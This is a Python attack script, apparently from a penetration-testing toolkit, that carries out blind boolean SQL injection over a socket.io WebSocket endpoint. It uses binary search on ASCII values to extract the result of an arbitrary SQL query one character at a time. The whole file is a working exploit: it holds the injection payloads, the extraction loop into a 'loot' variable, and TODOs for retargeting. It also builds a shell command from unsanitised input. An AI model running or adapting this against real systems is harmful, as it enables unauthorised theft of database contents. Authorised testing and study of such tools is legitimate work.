#!/usr/bin/python

# Note regarding truth anchor for injection: Injection evaluation is done in ws_client.py, if injection statements evaluates to true, it sets os._exit(0) as exit code, otherwise > 0  and -1 for errors
# Note regarding payload: try with concat (group_concat) function when selecting if payload fails
# Note regarding websockets: WebSockets are asynchronous, to perform the injection we are handling it here synchronously by using an extra script, opening a new connection for every payload and the current script waits for it to finish.

# TODO 1: CHANGE INJ_STR ACCORDING TO TARGET VULN (search for TODO in this script)
# TODO 2: CHANGE TRUTH ANCHOR IN ws_client.py ACCORDING TO NOTES ABOVE (or simply read logic in checkCharAgainstTarget function)

import requests
import sys
import subprocess

# checkCharAgainstTarget function has to return true if boolean equation is true - make sure that truth anchor is set correctly
def checkCharAgainstTarget(url, inj_str):
    #print("checkCharAgainstTarget")
    result = subprocess.run("python3 ./ws_client.py " + url + " \"" + inj_str+"\"", shell=True, capture_output=True) # run ws_client passing along target url (socket.io endpoint) and inj_str
    #print(result)
    res = result.returncode # return system-exit code of the command 
    #out = result.stdout # return output of the powershell command
    if(res == 0):
        return True
    elif(res == -1):
        sys.exit(1) # error occured in ws_client.py
    return False

# using binary search -> max 8 requests/chr (8th bcs could be None)
def binarySearchFindChar(url, inj_str_less,inj_str_equal):
    mid = 0
    start = 32 # ascii start
    end = 126 # ascii end

    while(True):
        mid = (start + end) // 2
        payload_less = "%s" % (inj_str_less.replace("[CHAR]", str(mid)))         
        
	# binary search anchor
        if ((end - start) <= 1):
            payload_equal_start = "%s" % (inj_str_equal.replace("[CHAR]", str(start)))
            payload_equal_end = "%s" % (inj_str_equal.replace("[CHAR]", str(end)))
            if(checkCharAgainstTarget(url, payload_equal_start)):
                return chr(start)
            elif(checkCharAgainstTarget(url, payload_equal_end)):
                return chr(end)
            return None # character not found, probably end of string reached
        elif(checkCharAgainstTarget(url, payload_less)):
            end = mid - 1
        else:   
            start = mid

def main():
    if len(sys.argv) != 3:
        print("(+) usage: %s <targetUrl> <cleanSubQuery>"  % sys.argv[0])
        print('(+) eg: %s \'http://target.com/socket.io\' \'SELECT user()\''  % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    cleanSubQuery = sys.argv[2]
    print("(+) Retrieving results for following Query:")
    print(cleanSubQuery)
    loot = ""
    # set length according to target (if known beforehand, otherwise use high number)
    for i in range(1, 500):
        # TODO 1: CHANGE THIS INJ_STR ACCORDING TO TARGET VULN
        inj_str_less = "doesnotexist@nope.com' or (ascii(substring((%s),%d,1)))<[CHAR]-- -" % (cleanSubQuery,i)
        inj_str_equal = "doesnotexist@nope.com' or (ascii(substring((%s),%d,1)))=[CHAR]-- -" % (cleanSubQuery,i)
        
        extracted_char = binarySearchFindChar(url, inj_str_less, inj_str_equal)
        if extracted_char == None:
            print("\n (+) All chars received")
            break
        loot+=extracted_char
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print(loot)
    print("\n(+) done!")

if __name__ == "__main__":
    main()
